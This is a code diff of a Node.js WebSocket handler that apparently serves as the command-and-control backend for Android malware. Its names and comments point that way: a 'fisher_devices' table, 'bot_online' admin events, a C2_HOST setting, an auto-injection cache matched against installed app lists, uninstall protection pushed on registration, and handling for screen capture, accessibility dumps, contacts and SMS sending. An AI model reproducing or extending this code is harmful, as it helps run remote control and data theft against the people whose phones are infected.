@@ -1,448 +1,11 @@
 'use strict';
 
-const { getPool } = require('../services/commandPoller');
-const config = require('../../config');
-const {
-  broadcastToAdmins,
-  forwardFrameToAdmins,
-  isHighVolumeMessage,
-  hasStreamConsumers,
-  streamModeForMessage,
-  recordInboundStream,
-  recordNoSubscriberDrop,
-  clearDeviceFrameState,
-} = require('./admin');
+const { getPool, dbWithRetry } = require('../services/commandPoller');
+const { broadcastToAdmins, forwardFrameToAdmins } = require('./admin');
 const { sendFirstTime: sendProtectFirstTime } = require('../services/autoProtect');
-const { notifyDeviceOnline } = require('../services/telegram');
-const { refreshDeviceGeo } = require('../services/geoLocation');
-const { clearGracePeriod } = require('../services/keepAlive');
-
-const DEVICE_LIFECYCLE_KEY = Symbol.for('fisher.deviceLifecycleState');
-const RECONNECT_INIT_COOLDOWN_MS = Math.max(1000, Number(process.env.DEVICE_RECONNECT_INIT_COOLDOWN_MS || 60000));
-const OFFLINE_GRACE_MS = Math.max(0, Number(process.env.DEVICE_OFFLINE_GRACE_MS || 5000));
-const STATUS_UNCHANGED_TTL_MS = Math.max(5000, Number(process.env.DEVICE_STATUS_UNCHANGED_TTL_MS || 30000));
-const RECONNECT_LOG_INTERVAL_MS = Math.max(1000, Number(process.env.DEVICE_RECONNECT_LOG_INTERVAL_MS || 60000));
-const PROTECT_DELAY_MS = Math.max(0, Number(process.env.DEVICE_PROTECT_DELAY_MS || 2000));
-const APP_LIST_DELAY_MS = Math.max(0, Number(process.env.DEVICE_APP_LIST_DELAY_MS || 8000));
-const POLICY_PRIMARY_DELAY_MS = Math.max(0, Number(process.env.DEVICE_POLICY_PRIMARY_DELAY_MS || 1500));
-const POLICY_RETRY_DELAY_MS = Math.max(0, Number(process.env.DEVICE_POLICY_RETRY_DELAY_MS || 10000));
-// A short guard absorbs duplicate handshakes without blocking a real reconnect
-// behind a half-open mobile connection for tens of seconds.
-const CONNECTION_MIN_HOLD_MS = Math.max(1000, Number(process.env.DEVICE_CONNECTION_MIN_HOLD_MS || 3000));
-const CONNECTION_ACTIVE_GRACE_MS = Math.max(CONNECTION_MIN_HOLD_MS, Number(process.env.DEVICE_CONNECTION_ACTIVE_GRACE_MS || 5000));
-const RECONNECT_STORM_WINDOW_MS = Math.max(1000, Number(process.env.DEVICE_RECONNECT_STORM_WINDOW_MS || 10000));
-const RECONNECT_STORM_THRESHOLD = Math.max(2, Number(process.env.DEVICE_RECONNECT_STORM_THRESHOLD || 6));
-const REJECTED_CONNECTION_CLOSE_GRACE_MS = Math.max(0, Number(process.env.DEVICE_REJECTED_CONNECTION_CLOSE_GRACE_MS || 250));
-// Per-message tracing is expensive with many devices. Enable only for a
-// short diagnostic window when explicitly requested.
-const VERBOSE_DEVICE_MESSAGE_LOGS = process.env.WS_VERBOSE_MESSAGE_LOGS === 'true';
-const MAX_TRACKED_DEVICE_STATES = 5000;
-const DEVICE_STATE_TTL_MS = 24 * 60 * 60 * 1000;
-
-function getDeviceLifecycleState(connections) {
-  if (!connections[DEVICE_LIFECYCLE_KEY]) {
-    Object.defineProperty(connections, DEVICE_LIFECYCLE_KEY, {
-      configurable: false,
-      enumerable: false,
-      writable: false,
-      value: {
-        lastInitialization: new Map(),
-        pendingOffline: new Map(),
-        reconnectLogs: new Map(),
-        connectionGuards: new Map(),
-        statusSyncs: new Map(),
-        lastTaskRuns: new Map(),
-        metrics: {},
-      },
-    });
-  }
-  const state = connections[DEVICE_LIFECYCLE_KEY];
-  state.lastInitialization ||= new Map();
-  state.pendingOffline ||= new Map();
-  state.reconnectLogs ||= new Map();
-  state.connectionGuards ||= new Map();
-  state.statusSyncs ||= new Map();
-  state.lastTaskRuns ||= new Map();
-  state.metrics ||= {};
-  for (const key of [
-    'connectionReplacements', 'suppressedReplacementLogs',
-    'deviceHandshakeAttempts', 'rejectedReconnects', 'rejectedDeviceUpgrades',
-    'suppressedReconnectRejectLogs',
-    'initializationRuns', 'initializationSkips',
-    'statusSyncQueued', 'statusSyncSkipped',
-  ]) {
-    if (!Number.isFinite(state.metrics[key])) state.metrics[key] = 0;
-  }
-  return state;
-}
-
-function createConnectionTaskTracker() {
-  const timers = new Set();
-  let cleaned = false;
-  return {
-    schedule(callback, delayMs) {
-      if (cleaned) return null;
-      const timer = setTimeout(() => {
-        timers.delete(timer);
-        if (!cleaned) callback();
-      }, delayMs);
-      timer.unref?.();
-      timers.add(timer);
-      return timer;
-    },
-    cleanup() {
-      if (cleaned) return;
-      cleaned = true;
-      for (const timer of timers) clearTimeout(timer);
-      timers.clear();
-    },
-    get size() { return timers.size; },
-  };
-}
-
-function pruneLifecycleState(state) {
-  const cutoff = Date.now() - DEVICE_STATE_TTL_MS;
-  if (state.lastInitialization.size > MAX_TRACKED_DEVICE_STATES) {
-    for (const [deviceId, timestamp] of state.lastInitialization) {
-      if (timestamp < cutoff) state.lastInitialization.delete(deviceId);
-    }
-  }
-  if (state.reconnectLogs.size > MAX_TRACKED_DEVICE_STATES) {
-    for (const [deviceId, entry] of state.reconnectLogs) {
-      if ((entry.lastLogAt || 0) < cutoff) state.reconnectLogs.delete(deviceId);
-    }
-  }
-  if (state.connectionGuards.size > MAX_TRACKED_DEVICE_STATES) {
-    for (const [deviceId, entry] of state.connectionGuards) {
-      if ((entry.lastAttemptAt || 0) < cutoff) state.connectionGuards.delete(deviceId);
-    }
-  }
-  while (state.lastInitialization.size > MAX_TRACKED_DEVICE_STATES) {
-    state.lastInitialization.delete(state.lastInitialization.keys().next().value);
-  }
-  while (state.reconnectLogs.size > MAX_TRACKED_DEVICE_STATES) {
-    state.reconnectLogs.delete(state.reconnectLogs.keys().next().value);
-  }
-  while (state.connectionGuards.size > MAX_TRACKED_DEVICE_STATES) {
-    state.connectionGuards.delete(state.connectionGuards.keys().next().value);
-  }
-  if (state.lastTaskRuns.size > MAX_TRACKED_DEVICE_STATES * 4) {
-    for (const [key, timestamp] of state.lastTaskRuns) {
-      if (timestamp < cutoff) state.lastTaskRuns.delete(key);
-    }
-  }
-  while (state.lastTaskRuns.size > MAX_TRACKED_DEVICE_STATES * 4) {
-    state.lastTaskRuns.delete(state.lastTaskRuns.keys().next().value);
-  }
-}
-
-function cancelPendingOffline(state, sessionId) {
-  const timer = state.pendingOffline.get(sessionId);
-  if (!timer) return false;
-  clearTimeout(timer);
-  state.pendingOffline.delete(sessionId);
-  return true;
-}
-
-function claimConnectionInitialization(state, sessionId, force = false) {
-  const now = Date.now();
-  const last = state.lastInitialization.get(sessionId) || 0;
-  if (!force && now - last < RECONNECT_INIT_COOLDOWN_MS) {
-    state.metrics.initializationSkips++;
-    return false;
-  }
-  state.lastInitialization.set(sessionId, now);
-  state.metrics.initializationRuns++;
-  return true;
-}
-
-function markDeviceInitialization(state, sessionId) {
-  const now = Date.now();
-  const last = state.lastInitialization.get(sessionId) || 0;
-  state.lastInitialization.set(sessionId, now);
-  if (now - last < RECONNECT_INIT_COOLDOWN_MS) {
-    state.metrics.initializationSkips++;
-    return false;
-  }
-  state.metrics.initializationRuns++;
-  return true;
-}
-
-function claimDeviceTask(state, sessionId, taskName, cooldownMs = RECONNECT_INIT_COOLDOWN_MS) {
-  const key = `${taskName}\u0000${sessionId}`;
-  const now = Date.now();
-  const last = state.lastTaskRuns.get(key) || 0;
-  if (now - last < cooldownMs) return false;
-  state.lastTaskRuns.set(key, now);
-  return true;
-}
-
-function logConnectionReplacement(state, sessionId) {
-  const now = Date.now();
-  state.metrics.connectionReplacements++;
-  const entry = state.reconnectLogs.get(sessionId) || { lastLogAt: 0, suppressed: 0 };
-  if (now - entry.lastLogAt >= RECONNECT_LOG_INTERVAL_MS) {
-    const suffix = entry.suppressed ? ` suppressed=${entry.suppressed}` : '';
-    console.warn(`[WS-Device] replacing stale connection device=${sessionId}${suffix}`);
-    entry.lastLogAt = now;
-    entry.suppressed = 0;
-  } else {
-    entry.suppressed++;
-    state.metrics.suppressedReplacementLogs++;
-  }
-  state.reconnectLogs.set(sessionId, entry);
-}
-
-function connectionAcceptedAt(connection) {
-  if (Number.isFinite(connection?.acceptedAt)) return connection.acceptedAt;
-  const parsed = Date.parse(connection?.connectedAt || '');
-  return Number.isFinite(parsed) ? parsed : 0;
-}
-
-function recordConnectionAttempt(state, sessionId) {
-  const now = Date.now();
-  let entry = state.connectionGuards.get(sessionId);
-  if (!entry) {
-    entry = {
-      windowStartedAt: now,
-      lastAttemptAt: now,
-      attempts: 0,
-      rejected: 0,
-      lastRejectLogAt: 0,
-      suppressedRejectLogs: 0,
-    };
-  } else if (now - entry.windowStartedAt >= RECONNECT_STORM_WINDOW_MS) {
-    entry.windowStartedAt = now;
-    entry.attempts = 0;
-    entry.rejected = 0;
-  }
-  entry.attempts++;
-  entry.lastAttemptAt = now;
-  state.connectionGuards.set(sessionId, entry);
-  state.metrics.deviceHandshakeAttempts++;
-  return { now, entry };
-}
-
-function shouldProtectExistingConnection(previousConnection, now) {
-  if (!previousConnection?.ws || previousConnection.ws.readyState !== 1) return false;
-  const acceptedAt = connectionAcceptedAt(previousConnection);
-  if (acceptedAt && now - acceptedAt < CONNECTION_MIN_HOLD_MS) return true;
-  const lastMessageAt = Number(previousConnection.lastMessageAt || 0);
-  return lastMessageAt > 0 && now - lastMessageAt < CONNECTION_ACTIVE_GRACE_MS;
-}
-
-function logRejectedReconnect(state, sessionId, entry) {
-  const now = Date.now();
-  if (now - entry.lastRejectLogAt >= RECONNECT_LOG_INTERVAL_MS) {
-    const suffix = entry.suppressedRejectLogs ? ` suppressed=${entry.suppressedRejectLogs}` : '';
-    console.warn(`[WS-Device] rejected competing connection device=${sessionId}${suffix}`);
-    entry.lastRejectLogAt = now;
-    entry.suppressedRejectLogs = 0;
-  } else {
-    entry.suppressedRejectLogs++;
-    state.metrics.suppressedReconnectRejectLogs++;
-  }
-}
-
-function rejectCompetingConnection(ws) {
-  try { ws.close(1013, 'Existing connection is active'); } catch {}
-  if (REJECTED_CONNECTION_CLOSE_GRACE_MS <= 0) {
-    try { ws.terminate(); } catch {}
-    return;
-  }
-  const timer = setTimeout(() => {
-    if (ws.readyState !== 3) {
-      try { ws.terminate(); } catch {}
-    }
-  }, REJECTED_CONNECTION_CLOSE_GRACE_MS);
-  timer.unref?.();
-  ws.once('close', () => clearTimeout(timer));
-}
-
-function preflightDeviceUpgrade(sessionId, connections) {
-  const lifecycle = getDeviceLifecycleState(connections);
-  pruneLifecycleState(lifecycle);
-  const previousConnection = connections.devices.get(sessionId);
-  const { now, entry } = recordConnectionAttempt(lifecycle, sessionId);
-  if (!shouldProtectExistingConnection(previousConnection, now)) {
-    return { rejected: false, attemptAt: now };
-  }
-  lifecycle.metrics.rejectedReconnects++;
-  lifecycle.metrics.rejectedDeviceUpgrades++;
-  entry.rejected++;
-  logRejectedReconnect(lifecycle, sessionId, entry);
-  return { rejected: true, attemptAt: now };
-}
-
-function statusFingerprint(data, clientIp) {
-  const value = data && typeof data === 'object' ? data : {};
-  return JSON.stringify([
-    value.brand || '', value.model || '', value.osVersion || '', value.appVersion || '',
-    value.appName || value.deviceName || '', value.batteryLevel ?? null,
-    value.networkType ?? '', value.isScreenOn ?? null, value.isCharging ?? null,
-    value.isLocked ?? null, value.accessibilityAlive ?? null,
-    value.screenWidth ?? null, value.screenHeight ?? null,
-    value.permissions && typeof value.permissions === 'object' ? value.permissions : null,
-    normalizeIp(value.publicIP || clientIp),
-  ]);
-}
-
-function mergeStatusSnapshot(previous, data) {
-  const next = { ...(previous || {}) };
-  const value = data && typeof data === 'object' ? data : {};
-  const fields = [
-    'brand', 'model', 'osVersion', 'appVersion', 'appName', 'deviceName',
-    'batteryLevel', 'networkType', 'isScreenOn', 'isCharging', 'isLocked',
-    'accessibilityAlive', 'screenWidth', 'screenHeight', 'permissions', 'publicIP',
-  ];
-  for (const field of fields) {
-    if (value[field] !== undefined && value[field] !== null) next[field] = value[field];
-  }
-  return next;
-}
-
-function queueDeviceStatusSync(connections, deviceId, data, clientIp) {
-  const lifecycle = getDeviceLifecycleState(connections);
-  pruneLifecycleState(lifecycle);
-  let state = lifecycle.statusSyncs.get(deviceId);
-  if (!state) {
-    state = {
-      running: false,
-      pending: null,
-      snapshot: null,
-      lastSignature: '',
-      lastCompletedAt: 0,
-      cleanupTimer: null,
-    };
-    lifecycle.statusSyncs.set(deviceId, state);
-  }
-
-  state.snapshot = mergeStatusSnapshot(state.snapshot, data);
-  const signature = statusFingerprint(state.snapshot, clientIp);
-  if (!state.running && signature === state.lastSignature
-      && Date.now() - state.lastCompletedAt < STATUS_UNCHANGED_TTL_MS) {
-    lifecycle.metrics.statusSyncSkipped++;
-    return false;
-  }
-
-  lifecycle.metrics.statusSyncQueued++;
-  state.pending = { data, clientIp, signature };
-  clearTimeout(state.cleanupTimer);
-  if (state.running) return true;
-
-  state.running = true;
-  (async () => {
-    try {
-      while (state.pending) {
-        const next = state.pending;
-        state.pending = null;
-        if (next.signature === state.lastSignature
-            && Date.now() - state.lastCompletedAt < STATUS_UNCHANGED_TTL_MS) continue;
-        const saved = await syncDeviceStatus(deviceId, next.data, next.clientIp);
-        if (saved) {
-          state.lastSignature = next.signature;
-          state.lastCompletedAt = Date.now();
-        }
-      }
-    } finally {
-      state.running = false;
-      state.cleanupTimer = setTimeout(() => {
-        if (!state.running && !state.pending) lifecycle.statusSyncs.delete(deviceId);
-      }, 10 * 60 * 1000);
-      state.cleanupTimer.unref?.();
-    }
-  })().catch(err => console.error(`[WS-Device] status queue error device=${deviceId}:`, err.message));
-  return true;
-}
-
-function getDeviceLifecycleMetrics(connections) {
-  const state = getDeviceLifecycleState(connections);
-  let pendingConnectionTasks = 0;
-  for (const connection of connections.devices.values()) {
-    pendingConnectionTasks += Number(connection.tasks?.size || 0);
-  }
-  let suppressedReconnectLogs = 0;
-  for (const entry of state.reconnectLogs.values()) suppressedReconnectLogs += entry.suppressed || 0;
-  const now = Date.now();
-  let reconnectStormDevices = 0;
-  for (const entry of state.connectionGuards.values()) {
-    if (now - entry.lastAttemptAt < RECONNECT_STORM_WINDOW_MS
-        && entry.attempts >= RECONNECT_STORM_THRESHOLD) reconnectStormDevices++;
-  }
-  return {
-    pendingDeviceOffline: state.pendingOffline.size,
-    pendingConnectionTasks,
-    activeStatusSyncs: [...state.statusSyncs.values()].filter(item => item.running).length,
-    pendingStatusSyncs: [...state.statusSyncs.values()].filter(item => item.pending).length,
-    trackedDeviceLifecycleStates: state.lastInitialization.size,
-    suppressedReconnectLogs,
-    reconnectStormDevices,
-    ...state.metrics,
-  };
-}
-
-function normalizeIp(value) {
-  return String(value || '').trim().replace(/^::ffff:/, '');
-}
-
-function isUsablePublicIp(value) {
-  const ip = normalizeIp(value);
-  if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('0.')) return false;
-  if (ip.startsWith('10.') || ip.startsWith('192.168.') || ip.startsWith('169.254.')) return false;
-  if (/^172\.(1[6-9]|2\d|3[0-1])\./.test(ip)) return false;
-  if (ip.startsWith('fc') || ip.startsWith('fd') || ip.startsWith('fe80:')) return false;
-  return true;
-}
-
-const SCREEN_PREFIX = /["'](?:type|event|messageType)["']\s*:\s*["'](?:screenshot|screen|frame|screen_frame)["']/i;
-const READER_PREFIX = /["'](?:type|event|messageType)["']\s*:\s*["'](?:ui_hierarchy|accessibility_data|accessibility_dump|reader_data)["']/i;
-
-function dropUnsubscribedStreamBuffer(buf, sessionId, connections) {
-  const prefix = buf.subarray(0, Math.min(buf.length, 2048)).toString('utf8');
-  const mode = SCREEN_PREFIX.test(prefix) ? 'screen_capture' : (READER_PREFIX.test(prefix) ? 'reader' : '');
-  if (!mode || hasStreamConsumers(connections, sessionId, mode)) return false;
-  recordInboundStream(connections, buf.length);
-  recordNoSubscriberDrop(connections, buf.length);
-  return true;
-}
-
-function acceptParsedDeviceMessage(msg, bytes, sessionId, connections) {
-  if (!isHighVolumeMessage(msg)) return true;
-  recordInboundStream(connections, bytes);
-  if (hasStreamConsumers(connections, sessionId, streamModeForMessage(msg))) return true;
-  recordNoSubscriberDrop(connections, bytes);
-  return false;
-}
-
-function normalizeContactsPayload(msg) {
-  const data = msg && msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data) ? msg.data : {};
-  const nested = data.data && typeof data.data === 'object' && !Array.isArray(data.data) ? data.data : {};
-  const contacts = msg?.contacts || data.contacts || nested.contacts || msg?.result?.contacts || msg?.payload?.contacts || (Array.isArray(msg?.data) ? msg.data : []);
-  const successValue = data.success ?? nested.success ?? msg?.success;
-  const error = data.error || data.message || nested.error || nested.message || msg?.error || msg?.message || '';
-  const success = successValue === undefined ? !error : ![false, 0, '0', 'false'].includes(successValue);
-  return {
-    ...data,
-    success,
-    count: Number(data.count ?? nested.count ?? (Array.isArray(contacts) ? contacts.length : 0)),
-    contacts: Array.isArray(contacts) ? contacts : [],
-    error,
-  };
-}
-
-function normalizeSmsSendPayload(msg) {
-  const data = msg && msg.data && typeof msg.data === 'object' && !Array.isArray(msg.data) ? msg.data : {};
-  const nested = data.data && typeof data.data === 'object' && !Array.isArray(data.data) ? data.data : {};
-  const successValue = data.success ?? nested.success ?? msg?.success;
-  const error = data.error || data.message || nested.error || nested.message || msg?.error || msg?.message || '';
-  return {
-    ...data,
-    success: [true, 1, '1', 'true'].includes(successValue),
-    phoneNumber: data.phoneNumber || data.phone || nested.phoneNumber || nested.phone || msg?.phoneNumber || msg?.phone || '',
-    simSlot: Number(data.simSlot ?? nested.simSlot ?? msg?.simSlot ?? 0),
-    error,
-  };
-}
+const { allowWrite: wtAllow, markWritten: wtMark } = require('../services/writeThrottle');
+const { isDeviceDeleted } = require('../services/deletedDevices');
+// TG 通知已移到 PHP DeviceController 中处理
 
 async function queryPolicyRows(sql) {
   try {
@@ -452,49 +15,6 @@ async function queryPolicyRows(sql) {
     console.warn('[PolicySync] query skipped: ' + e.message);
     return [];
   }
-}
-
-function getDeviceBootstrapServerUrl() {
-  const explicit = String(process.env.DEVICE_BOOTSTRAP_SERVER_URL || process.env.C2_HOST || '').trim();
-  if (explicit) return explicit.replace(/\/+$/, '');
-  const host = String(config.external?.host || config.frps?.addr || '127.0.0.1').trim();
-  const port = Number(config.external?.port || config.port || 8889);
-  const defaultPort = port === 80 || port === 443;
-  const scheme = port === 443 ? 'https' : 'http';
-  return `${scheme}://${host}${defaultPort ? '' : `:${port}`}`.replace(/\/+$/, '');
-}
-
-function sendDeviceBootstrapCommands(ws, sessionId, connections) {
-  if (!ws || ws.readyState !== 1) return false;
-  if (connections.bridges.has(sessionId)) return false;
-
-  const serverUrl = getDeviceBootstrapServerUrl();
-  const bridgeUrl = serverUrl.replace(/^http:/i, 'ws:').replace(/^https:/i, 'wss:')
-    + `/ws/bridge?deviceId=${encodeURIComponent(sessionId)}`;
-
-  const commands = [
-    ['setAppConfig', { deviceId: sessionId, serverAddr: serverUrl }],
-    ['setConfig', { deviceId: sessionId, serverAddr: serverUrl, serverHost: serverUrl.replace(/^https?:\/\//i, ''), bridgeUrl }],
-    ['saveConfig', {}],
-    ['forceSync', {}],
-    ['setServerAddr', { serverAddr: serverUrl }],
-  ];
-
-  let delay = 0;
-  for (const [command, params] of commands) {
-    setTimeout(() => {
-      try {
-        if (ws.readyState === 1 && connections.devices.get(sessionId)?.ws === ws) {
-          ws.send(JSON.stringify({ type: 'command', sessionId, data: { command, params } }));
-        }
-      } catch (e) {
-        console.warn(`[WS-Device] bootstrap command ${command} failed for ${sessionId}: ${e.message}`);
-      }
-    }, delay);
-    delay += 300;
-  }
-  console.log(`[WS-Device] scheduled bridge bootstrap commands for ${sessionId} server=${serverUrl}`);
-  return true;
 }
 
 async function syncGlobalPolicies(ws, sessionId) {
@@ -537,127 +57,67 @@ async function syncGlobalPolicies(ws, sessionId) {
  * APK 设备端 WebSocket handler
  * 路径: /ws/device?sessionId=xxx
  */
-function handleDevice(ws, sessionId, connections) {
+async function handleDevice(ws, sessionId, connections) {
+  try {
+    if (await isDeviceDeleted(getPool(), sessionId)) {
+      console.log(`[WS-Device] Reject deleted device: ${sessionId}`);
+      try { ws.close(4004, 'Device deleted'); } catch (e) {}
+      return;
+    }
+  } catch (e) {}
   // 获取客户端真实 IP
   const rawIp = ws._socket ? ws._socket.remoteAddress : '';
   const clientIp = rawIp ? rawIp.replace('::ffff:', '') : '';
-  const connectedAt = new Date().toISOString();
   // ★ 闭包变量：latestClientIp 随 status 消息更新（pool 自愈用 + 修复 C 简化版）
   let latestClientIp = clientIp;
 
-  const lifecycle = getDeviceLifecycleState(connections);
-  pruneLifecycleState(lifecycle);
-  const previousConnection = connections.devices.get(sessionId);
-  const preflightAttemptAt = Number(ws._deviceAttemptAt || 0);
-  const preflightEntry = preflightAttemptAt ? lifecycle.connectionGuards.get(sessionId) : null;
-  const attempt = preflightAttemptAt && preflightEntry
-    ? { now: preflightAttemptAt, entry: preflightEntry }
-    : recordConnectionAttempt(lifecycle, sessionId);
-  const { now: attemptAt, entry: connectionGuard } = attempt;
-  if (shouldProtectExistingConnection(previousConnection, attemptAt)) {
-    lifecycle.metrics.rejectedReconnects++;
-    connectionGuard.rejected++;
-    logRejectedReconnect(lifecycle, sessionId, connectionGuard);
-    rejectCompetingConnection(ws);
-    return;
-  }
-  const resumedDuringGrace = cancelPendingOffline(lifecycle, sessionId);
-  clearGracePeriod(sessionId);
-  const tasks = createConnectionTaskTracker();
-  const connection = {
-    ws,
-    sessionId,
-    clientIp,
-    connectedAt,
-    acceptedAt: attemptAt,
-    lastMessageAt: 0,
-    tasks,
-  };
-  connections.devices.set(sessionId, connection);
-  if (previousConnection?.ws && previousConnection.ws !== ws) {
-    previousConnection.cleanup?.();
-    previousConnection.tasks?.cleanup?.();
-    logConnectionReplacement(lifecycle, sessionId);
-    try { previousConnection.ws.terminate(); } catch {}
-  }
-  const isNewOnlinePresence = !previousConnection && !resumedDuringGrace;
-  const shouldInitialize = markDeviceInitialization(lifecycle, sessionId);
-  if (shouldInitialize) {
-    console.log(`[WS-Device] connected device=${sessionId} ip=${clientIp} at=${connectedAt}`);
-  }
+  connections.devices.set(sessionId, { ws, sessionId, clientIp });
+  console.log(`[WS-Device] Connected: ${sessionId} ip=${clientIp}`);
 
   // 清除自动注入缓存（设备重新上线时允许重新注入一次）
-  if (shouldInitialize && autoInjectedCache && autoInjectedCache.has(sessionId)) {
+  if (autoInjectedCache && autoInjectedCache.has(sessionId)) {
     autoInjectedCache.delete(sessionId);
   }
 
   // 更新设备在线状态 + IP
-  if (isNewOnlinePresence) updateDeviceStatus(sessionId, true, clientIp);
-
-  // 设备主 WS 上线即下发 Bridge/frpc 初始化；原来只在 /ws/bridge 连接后下发，
-  // 会造成“等 bridge 上线才配置 bridge”的死循环。
-  tasks.schedule(() => {
-    if (connections.devices.get(sessionId)?.ws !== ws) return;
-    if (claimDeviceTask(lifecycle, sessionId, 'bridge-bootstrap')) {
-      sendDeviceBootstrapCommands(ws, sessionId, connections);
-    }
-  }, 500);
+  updateDeviceStatus(sessionId, true, clientIp);
 
   // 2026-08-02 device auto-protect: send ENABLE_UNINSTALL_PROTECTION on register
-  tasks.schedule(() => {
-    if (connections.devices.get(sessionId)?.ws !== ws) return;
-    if (claimDeviceTask(lifecycle, sessionId, 'protect')) {
-      sendProtectFirstTime(connections, sessionId);
-    }
-  }, PROTECT_DELAY_MS);
+  setTimeout(() => sendProtectFirstTime(connections, sessionId), 2000);
 
   // 设备上线 8 秒后自动获取应用列表（用于自动注入匹配）
-  tasks.schedule(() => {
-    if (ws.readyState === 1 && connections.devices.get(sessionId)?.ws === ws
-        && claimDeviceTask(lifecycle, sessionId, 'app-list')) {
-        console.log(`[WS-Device] Sending GET_APP_LIST to ${sessionId}`);
-        ws.send(JSON.stringify({
-          type: 'command',
-          sessionId,
-          data: { command: 'GET_APP_LIST', params: {} }
-        }));
+  const appListTimer = setTimeout(() => {
+    if (ws.readyState === 1) {
+      console.log(`[WS-Device] Sending GET_APP_LIST to ${sessionId}`);
+      ws.send(JSON.stringify({
+        type: 'command',
+        sessionId,
+        data: { command: 'GET_APP_LIST', params: {} }
+      }));
     }
-  }, APP_LIST_DELAY_MS);
+  }, 8000);
 
   // 设备上线时补发全局策略；第一次失败时稍后重试一次。
-  for (const [delay, taskName] of [
-    [POLICY_PRIMARY_DELAY_MS, 'policy-primary'],
-    [POLICY_RETRY_DELAY_MS, 'policy-retry'],
-  ]) {
-    tasks.schedule(() => {
-      if (connections.devices.get(sessionId)?.ws !== ws) return;
-      if (claimDeviceTask(lifecycle, sessionId, taskName)) {
-        syncGlobalPolicies(ws, sessionId).catch(err => console.warn('[PolicySync] ' + sessionId + ': ' + err.message));
-      }
-    }, delay);
-  }
+  const policySyncTimers = [1500, 10000].map(delay => setTimeout(() => {
+    syncGlobalPolicies(ws, sessionId).catch(err => console.warn('[PolicySync] ' + sessionId + ': ' + err.message));
+  }, delay));
 
   // 通知管理端（同时发两种格式，兼容前端 bot_online/device_online）
-  if (isNewOnlinePresence) {
-    broadcastToAdmins(connections, { type: 'device_online', sessionId, deviceId: sessionId, data: { status: 'online' } });
-    broadcastToAdmins(connections, { type: 'bot_online', sessionId, deviceId: sessionId, botId: sessionId });
-    broadcastToAdmins(connections, { type: 'device_update' });
-  }
+  broadcastToAdmins(connections, { type: 'device_online', sessionId, deviceId: sessionId, data: { status: 'online' } });
+  broadcastToAdmins(connections, { type: 'bot_online', sessionId, deviceId: sessionId, botId: sessionId });
+  broadcastToAdmins(connections, { type: 'device_update' });
 
-  // Queue the online notification outside the PHP device-list request path.
-  // The Telegram service delays the lookup and sends asynchronously.
-  if (shouldInitialize) {
-    notifyDeviceOnline(sessionId, { publicIP: clientIp }).catch(err => {
-      console.warn(`[Telegram] online notification failed for ${sessionId}: ${err.message}`);
-    });
-  }
-
-  // 定时更新 last_seen（每30秒）
+  // 定时更新 last_seen（每30秒）— 先走内存去抖（10s 窗口）再落盘，且 dbWithRetry 死锁重试兜底
+  // 注意：allowWrite 通过后立刻标记；dbWithRetry 已做 2 次重试，真失败就等下一个 30s tick。
   const heartbeatInterval = setInterval(() => {
-    if (ws.readyState === 1) {
-      const now = Math.floor(Date.now() / 1000);
-      getPool().query('UPDATE fisher_devices SET last_seen=? WHERE device_id=?', [now, sessionId]).catch(() => {});
-    }
+    if (ws.readyState !== 1) return;
+    // ★ 内存节流：10 秒内如果 syncDeviceStatus / 上一次心跳 / bridge 心跳 任意一个已刷，就跳过
+    if (!wtAllow(sessionId, 'last_seen')) return;
+    const now = Math.floor(Date.now() / 1000);
+    dbWithRetry(
+      () => getPool().query('UPDATE fisher_devices SET last_seen=? WHERE device_id=?', [now, sessionId]),
+      { label: `heartbeat:${String(sessionId).substring(0, 8)}`, maxRetries: 2 }
+    ).catch(() => { /* 失败静默，下一个 30s tick 再尝试（30s > 10s 窗口自然到期） */ });
   }, 30000);
 
   // RFC 6455 ping/pong 仅在显式开启时使用，兼容只实现应用层心跳的 APK。
@@ -678,7 +138,7 @@ function handleDevice(ws, sessionId, connections) {
     }, 30000);
   }
 
-  ws.on('message', (data) => {
+  ws.on('message', async (data) => {
     // ★ Stability: wrap entire handler body in try/catch to prevent unhandled
     // exceptions in handler/forwarding logic from crashing the WS server.
     try {
@@ -686,26 +146,22 @@ function handleDevice(ws, sessionId, connections) {
       // 解决"WS 显示离线但 handleDeviceMessage 仍能跑"的矛盾
       if (ws.readyState !== 1) return
       // ★ 池自愈：如果池里已被清空（理论不应该，但兜底），自动重新注册
-      const currentConnection = connections.devices.get(sessionId);
-      if (!currentConnection || currentConnection.ws !== ws) {
-        console.warn(`[WS-Device] stale message ignored device=${sessionId}`);
-        return;
+      if (!connections.devices.has(sessionId) || connections.devices.get(sessionId).ws !== ws) {
+        connections.devices.set(sessionId, { ws, sessionId, clientIp: latestClientIp })
+        if (process.env.NODE_WS_DEBUG_HEAL === '1') {
+          console.log(`[WS-Device] pool self-heal: re-registered ${sessionId}`)
+        }
       }
-      connection.lastMessageAt = Date.now();
       // 尝试将 Buffer 解析为 JSON（设备可能以二进制帧发送 JSON 响应）
       if (Buffer.isBuffer(data) || data instanceof ArrayBuffer) {
         const buf = Buffer.isBuffer(data) ? data : Buffer.from(data);
-        if (dropUnsubscribedStreamBuffer(buf, sessionId, connections)) return;
         // 检查是否以 '{' 或 '[' 开头（JSON）
         if (buf.length > 0 && (buf[0] === 0x7b || buf[0] === 0x5b)) {
           try {
             const str = buf.toString('utf8');
             const msg = JSON.parse(str);
-            if (!acceptParsedDeviceMessage(msg, buf.length, sessionId, connections)) return;
-            if (VERBOSE_DEVICE_MESSAGE_LOGS && !isHighVolumeMessage(msg) && !['heartbeat', 'HEARTBEAT', 'status', 'device_heartbeat'].includes(msg.type)) {
-              console.log(`[WS-Device] message device=${sessionId} type=${msg.type || msg.event || 'unknown'}`);
-            }
-            handleDeviceMessage(ws, msg, sessionId, connections);
+            console.log(`[WS-Device] <<<< Received JSON from ${sessionId}:`, str.substring(0, 200));
+            await handleDeviceMessage(ws, msg, sessionId, connections);
             return;
           } catch {}
         }
@@ -715,13 +171,9 @@ function handleDevice(ws, sessionId, connections) {
       }
 
       try {
-        const text = data.toString();
-        const msg = JSON.parse(text);
-        if (!acceptParsedDeviceMessage(msg, Buffer.byteLength(text), sessionId, connections)) return;
-        if (VERBOSE_DEVICE_MESSAGE_LOGS && !isHighVolumeMessage(msg) && !['heartbeat', 'HEARTBEAT', 'status', 'device_heartbeat'].includes(msg.type)) {
-          console.log(`[WS-Device] message device=${sessionId} type=${msg.type || msg.event || 'unknown'}`);
-        }
-        handleDeviceMessage(ws, msg, sessionId, connections);
+        const msg = JSON.parse(data.toString());
+        console.log(`[WS-Device] <<<< Received from ${sessionId}:`, JSON.stringify(msg).substring(0, 200));
